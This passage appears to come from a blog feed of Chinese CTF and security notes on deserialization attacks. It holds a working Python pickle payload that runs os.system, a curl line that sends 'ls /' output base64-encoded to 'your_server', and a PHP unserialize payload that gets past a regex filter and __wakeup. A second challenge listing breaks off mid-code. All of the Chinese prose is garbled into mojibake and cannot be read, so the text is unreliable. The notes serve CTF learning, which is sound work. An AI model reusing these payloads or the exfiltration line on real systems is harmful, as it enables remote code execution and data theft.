punctuation">)</span></code></pre><p>æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200407100434411.png" alt loading="lazy"></p><p>å¯è§æˆåŠŸæ‰§è¡Œäº†å‘½ä»¤</p><p>å®Œæ•´payloadå¦‚ä¸‹ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token string">b'\x80\x03c__main__\nFoo\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVdir\nb0c__main__\nFoo\nq\x00)\x81q\x01&#125;q\x02X\x03\x00\x00\x00valq\x03K\x04sb.'</span></code></pre><p>æ¶æ„ä»£ç æ‰§è¡Œå®Œåå°†æ ˆå¼¹ç©ºï¼Œç„¶åå‹ä¸€ä¸ªæ­£å¸¸çš„<code>student</code>å…¥æ ˆ</p><h3 id="ç»†èŠ‚"><a href="#ç»†èŠ‚" class="headerlink" title="ç»†èŠ‚"></a>ç»†èŠ‚</h3><p>å…¶ä»–æ¨¡å—çš„loadä¹Ÿå¯ä»¥è§¦å‘pickleååºåˆ—åŒ–æ¼æ´ã€‚ä¾‹å¦‚ï¼š<code>numpy.load()</code>å…ˆå°è¯•ä»¥numpyè‡ªå·±çš„æ•°æ®æ ¼å¼å¯¼å…¥ï¼›å¦‚æœå¤±è´¥ï¼Œåˆ™å°è¯•ä»¥pickleçš„æ ¼å¼å¯¼å…¥ã€‚å› æ­¤<code>numpy.load()</code>ä¹Ÿå¯ä»¥è§¦å‘pickleååºåˆ—åŒ–æ¼æ´ã€‚</p><p>å³ä½¿ä»£ç ä¸­æ²¡æœ‰<code>import os</code>ï¼ŒGLOBALæŒ‡ä»¤ä¹Ÿå¯ä»¥è‡ªåŠ¨å¯¼å…¥<code>os.system</code>ã€‚å› æ­¤ï¼Œä¸èƒ½è®¤ä¸ºâ€œæˆ‘ä¸åœ¨ä»£ç é‡Œé¢å¯¼å…¥osåº“ï¼Œpickleååºåˆ—åŒ–çš„æ—¶å€™å°±ä¸èƒ½æ‰§è¡Œos.systemâ€ã€‚</p><p>å³ä½¿æ²¡æœ‰å›æ˜¾ï¼Œä¹Ÿå¯ä»¥å¾ˆæ–¹ä¾¿åœ°è°ƒè¯•æ¶æ„ä»£ç ã€‚åªéœ€è¦æ‹¥æœ‰ä¸€å°å…¬ç½‘æœåŠ¡å™¨ï¼Œæ‰§è¡Œ</p><pre class="language-none"><code class="language-none">os.system(&#39;curl your_server&#x2F;&#96;ls &#x2F; | base64&#96;&#39;)</code></pre><p>ç„¶åæŸ¥è¯¢æ‚¨è‡ªå·±çš„æœåŠ¡å™¨æ—¥å¿—ï¼Œå°±èƒ½çœ‹åˆ°ç»“æœã€‚è¿™æ˜¯å› ä¸ºï¼šä»¥åå¼•å·åŒ…å«çš„ä»£ç ï¼Œåœ¨shä¸­ä¼šç›´æ¥æ‰§è¡Œï¼Œè¿”å›å…¶ç»“æœã€‚</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://zhuanlan.zhihu.com/p/89132768">https://zhuanlan.zhihu.com/p/89132768</a></li><li><a href="https://mp.weixin.qq.com/s/3CLh1V9FZ36-Tw9ikUSsaA">https://mp.weixin.qq.com/s/3CLh1V9FZ36-Tw9ikUSsaA</a></li><li><a href="https://www.cnblogs.com/cioi/p/12464592.html">https://www.cnblogs.com/cioi/p/12464592.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> å¤‡å¿˜å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-ååºåˆ—åŒ–</title>
      <link href="posts/d3333ead/"/>
      <url>posts/d3333ead/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>phpä¸­å¸¸ç”¨çš„å‡ ç§é­”æœ¯æ–¹æ³•å’Œè§¦å‘æ¡ä»¶</p><pre class="language-php" data-language="php"><code class="language-php">__construct ï¼šå½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨__destruct ï¼šå½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨__toString ï¼šå½“ä¸€ä¸ªç±»æˆ–å¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¢«è°ƒç”¨__wakeup ï¼šå½“ä¸€ä¸ªå¯¹è±¡ä½¿ç”¨ unserialize æ—¶è§¦å‘ï¼Œååºåˆ—åŒ–æ—¶è§¦å‘__sleep ï¼šå½“ä¸€ä¸ªå¯¹è±¡ä½¿ç”¨ serialize æ—¶è§¦å‘ï¼Œåºåˆ—åŒ–æ—¶è§¦å‘__get ï¼šå½“ä¸€ä¸ªå¯¹è±¡è¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶è§¦å‘__set ï¼šå½“ä¸€ä¸ªå¯¹è±¡åœ¨ç»™ä¸å¯è®¿é—®å±æ€§èµ‹å€¼æ—¶__isset ï¼šå½“ä¸€ä¸ªå¯¹è±¡å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨ <span class="token keyword">isset</span> æˆ– <span class="token keyword">empty</span> æ—¶è§¦å‘__unset ï¼šå½“ä¸€ä¸ªå¯¹è±¡å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨ <span class="token keyword">unset</span> æ—¶è§¦å‘__invoke ï¼šå½“ä¸€ä¸ªå¯¹è±¡å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶è§¦å‘__set_state ï¼šå½“ä¸€ä¸ªå¯¹è±¡è°ƒç”¨ var_export å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨__call ï¼šå½“ä¸€ä¸ªå¯¹è±¡åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ __callStatic ï¼šå½“ä¸€ä¸ªå¯¹è±¡åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</code></pre><p>ä¸åŒå±æ€§ä¹‹é—´çš„åŒºåˆ«</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span>  å˜é‡ï¼ˆå…¬æœ‰ï¼‰ ç›´æ¥å°†å˜é‡åååºåˆ—åŒ–å‡ºæ¥ <span class="token keyword">protected</span>  å˜é‡ï¼ˆå—ä¿æŠ¤ï¼‰ \x00 <span class="token operator">+</span> <span class="token operator">*</span> <span class="token operator">+</span> \x00 <span class="token operator">+</span> å˜é‡å <span class="token keyword">private</span>  å˜é‡ï¼ˆç§æœ‰ï¼‰ \x00 <span class="token operator">+</span> ç±»å <span class="token operator">+</span> \x00 <span class="token operator">+</span> å˜é‡å</code></pre><span id="more"></span><hr><h3 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h3><p>æ„Ÿè°¢xctfå¹³å°ï¼Œé¢˜ç›®<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5409&page=1">é“¾æ¥</a></p><p>é¢˜ç›®ä»£ç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Demo</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">echo</span> @<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token comment">//the secret is in the fl4g.php</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'stop hacking!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span></code></pre><p>ç”±ä»£ç å¯çŸ¥ï¼Œé¢˜ç›®æä¾›äº†ä¸€ä¸ª<code>var</code>å‚æ•°ç»™æˆ‘ä»¬è¿›è¡Œ<code>get</code>ä¼ å‚ï¼Œé¦–å…ˆå…ˆå¯¹<code>var</code>è¿›è¡Œ<code>base64</code>è§£ç ï¼Œç„¶åè¿›å…¥<code>if</code>åˆ¤æ–­è¯­å¥ï¼Œè‹¥åˆ¤æ–­æ¡ä»¶ä¸æˆç«‹å°±è¿›å…¥<code>else</code>ï¼Œè¿›è¡Œ<code>unserialize</code>æ“ä½œï¼Œé¢˜ç›®æä¾›äº†ä¸€ä¸ª<code>Demo</code>ç±»æ¥è¿›è¡Œåºåˆ—åŒ–æ“ä½œï¼Œä¸”å…¶ä¸­çš„<code>__destruct</code>æ–¹æ³•å¯ä»¥å°†ä»£ç æ˜¾ç¤ºå‡ºæ¥ï¼Œé¢˜ç›®æç¤ºäº†<code>the secret is in the fl4g.php</code>ï¼Œflagåº”è¯¥å°±åœ¨<code>fl4g.php</code>ä¸­ï¼Œäºæ˜¯å¯»æ‰¾çªç ´ç‚¹</p><p>é¢˜ç›®é™åˆ¶æ¡ä»¶ï¼š</p><blockquote><p>preg_match(â€˜/[oc]:\d+:/iâ€™, $var)ï¼šå¯¹ä¼ å…¥çš„varç»è¿‡base64è§£å¯†åçš„å­—ç¬¦ä¸²è¿›æ­£åˆ™åŒ¹é…ï¼Œæ¥é˜²æ­¢ååºåˆ—åŒ–æ“ä½œ</p><p><code>__wakeup</code>å‡½æ•°ï¼š<code>__wakeup()</code>æ˜¯ç”¨åœ¨ååºåˆ—åŒ–æ“ä½œä¸­ã€‚<code>unserialize()</code>ä¼šæ£€æŸ¥å­˜åœ¨ä¸€ä¸ª<code>__wakeup()</code>æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™å…ˆä¼šè°ƒç”¨<code>__wakeup()</code>æ–¹æ³•ï¼Œåœ¨è¿™é‡Œè¿™ä¸ªå‡½æ•°ä¼šå°†<code>file</code>èµ‹å€¼ä¸º<code>index.php</code></p></blockquote><p>å¯æ˜¯è¿™ä¸¤ç§æ–¹æ³•éƒ½å¯ä»¥è¿›è¡Œç»•è¿‡ï¼š</p><blockquote><p>preg_match()ï¼šè¿™ä¸ªæ­£åˆ™åŒ¹é…å‡½æ•°æ˜¯ç”¨æ¥é˜²æ­¢ååºåˆ—åŒ–çš„å¼€å¤´çš„ï¼Œå¦‚<code>O:4:</code>å³å¯åŒ¹é…ä¸Šï¼Œä½†å¯ä»¥ç”¨+è¿›è¡Œç»•è¿‡ï¼Œå¯ä»¥å†™æˆ<code>O:+4:</code>ååºåˆ—åŒ–å‡½æ•°ä¸€æ ·è¯†åˆ«</p><p><code>__wakeup</code>å‡½æ•°ï¼š<code>__wakeup()</code>æ¼æ´å°±æ˜¯ä¸æ•´ä¸ªå±æ€§ä¸ªæ•°å€¼æœ‰å…³ã€‚å½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®ä¸ªæ•°çš„å±æ€§æ—¶å°±ä¼šè·³è¿‡<code>__wakeup</code>çš„æ‰§è¡Œã€‚ä¾‹å¦‚<code>O:4:&quot;Demo&quot;:1:</code>ï¼ŒDemoåé¢çš„1è¡¨ç¤ºçš„å°±æ˜¯ç±»çš„å±æ€§ä¸ªæ•°ï¼Œå°†1æ”¹å¤§å³å¯è·³è¿‡<code>__wakeup</code>å‡½æ•°çš„æ‰§è¡Œ</p></blockquote><p>äºæ˜¯æ„é€ payloadï¼š<code>O:+4:&quot;Demo&quot;:4:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p><p>æ³¨æ„<code>file</code>å‰é¢çš„<code>Demo</code>å·¦å³éœ€è¦æœ‰<code>%00</code></p><pre class="language-php" data-language="php"><code class="language-php">åºåˆ—åŒ–åï¼šv1 è¡¨ç¤º <span class="token keyword">public</span>   <span class="token operator">%</span><span class="token number">00</span>Demo<span class="token operator">%</span><span class="token number">00</span>v2 è¡¨ç¤º <span class="token keyword">private</span><span class="token punctuation">(</span>Demoä¸ºç±»å<span class="token punctuation">)</span>   <span class="token operator">%</span><span class="token number">00</span><span class="token operator">*</span><span class="token operator">%</span><span class="token number">00</span>v3 è¡¨ç¤º <span class="token keyword">protected</span>  v1<span class="token punctuation">,</span>v2<span class="token punctuation">,</span>v3ä¸ºå±æ€§å</code></pre><p><code>base64</code>ç¼–ç å<code>TzorNDoiRGVtbyI6NDp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p><blockquote><p>å‚è€ƒï¼š<br><a href="https://www.jianshu.com/p/8f498198fc3d">phpåºåˆ—åŒ–ä¸ååºåˆ—åŒ–å…¥é—¨</a><br><a href="https://www.cnblogs.com/kacha886/p/9115503.html">é­”æœ¯æ–¹æ³•<code>__sleep()</code>,<code>__wakeup()</code></a><br><a href="http://blog.sina.com.cn/s/blog_15ebf299a0102xnug.html">__wakeup()å‡½æ•°æ¼æ´ä»¥åŠå®é™…æ¼æ´åˆ†æ</a></p></blockquote><p>PSï¼šphpä»£ç å®¡è®¡æ˜¯ä¸ªå¤§å‘ï¼Œåˆšæ¥è§¦çš„è¯ä¸Šæ‰‹è¿˜æ˜¯æœ‰ç‚¹å›°éš¾ï¼Œè¿˜æ˜¯è¦å¤šçœ‹çœ‹phpä»£ç ï¼Œéœ€è¦æœ‰é¢å‘å¯¹è±¡ç¼–ç¨‹çš„æ€æƒ³ï¼Œå¦åˆ™ä»£ç é‡å¤§çš„å°±æ¯”è¾ƒéš¾å…¥æ‰‹ï¼›åºåˆ—åŒ–ç®—æ˜¯ä¸€ä¸ªé‡ç‚¹äº†å§ï¼ŒåŸæ¥å°±æ¥è§¦è¿‡å¥½å¤šè¿™æ ·çš„é¢˜ï¼Œä½†éƒ½ä¸æ€ä¹ˆçœ‹å¾—æ‡‚ï¼Œæ‰€ä»¥å°±éƒ½ç•¥è¿‡äº†ï¼Œç°åœ¨å­¦äº†ç‚¹phpåŸºç¡€å‹‰å¼ºèƒ½å¤Ÿçœ‹çš„æ‡‚ï¼Œæ€»ä¹‹å¤šçœ‹å¤šæ€è€ƒï¼Œæ…¢æ…¢æ¥å§ã€‚</p><hr><h3 id="æå®¢å¤§æŒ‘æˆ˜-2019â€”PHP"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019â€”PHP" class="headerlink" title="æå®¢å¤§æŒ‘æˆ˜-2019â€”PHP"></a>æå®¢å¤§æŒ‘æˆ˜-2019â€”PHP</h3><p>ç•Œé¢ï¼š<br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200324104326758.png" alt loading="lazy"></p><p>é¢˜ç›®æç¤ºç½‘ç«™æœ‰å¤‡ä»½ï¼Œäºæ˜¯è®¿é—®<code>www.zip</code>ï¼Œå¾—åˆ°ç½‘é¡µæºç ï¼š</p><p>index.php</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  ......<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">    ......</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>world<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">text-shadow</span><span class="token punctuation">:</span>0px 0px 5px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>arial<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>black<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span>20px<span class="token punctuation">;</span><span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span><span class="token property">bottom</span><span class="token punctuation">:</span> 85%<span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span> 440px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>KaiTi<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>å› ä¸ºæ¯æ¬¡çŒ«çŒ«éƒ½åœ¨æˆ‘é”®ç›˜ä¸Šä¹±è·³ï¼Œæ‰€ä»¥æˆ‘æœ‰ä¸€ä¸ªè‰¯å¥½çš„å¤‡ä»½ç½‘ç«™çš„ä¹ æƒ¯    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">text-shadow</span><span class="token punctuation">:</span>0px 0px 5px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>arial<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>black<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span>20px<span class="token punctuation">;</span><span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span><span class="token property">bottom</span><span class="token punctuation">:</span> 80%<span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span> 700px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>KaiTi<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>ä¸æ„§æ˜¯æˆ‘ï¼ï¼ï¼    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">text-shadow</span><span class="token punctuation">:</span>0px 0px 5px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>arial<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>black<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span>20px<span class="token punctuation">;</span><span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span><span class="token property">bottom</span><span class="token punctuation">:</span> 70%<span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span> 640px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>KaiTi<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>    <span class="token prolog">&lt;?php    include 'class.php';    $select = $_GET['select'];    $res=unserialize(@$select);    ?></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span><span class="token property">bottom</span><span class="token punctuation">:</span> 5%<span class="token punctuation">;</span><span class="token property">width</span><span class="token punctuation">:</span> 99%<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>center<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">font</span><span class="token punctuation">:</span>italic 15px Georgia<span class="token punctuation">,</span>serif<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>white<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span> Syclover @ cl4y<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span>  <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>class.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Name</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>NO!!!hacker!!!&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You name is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You password is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        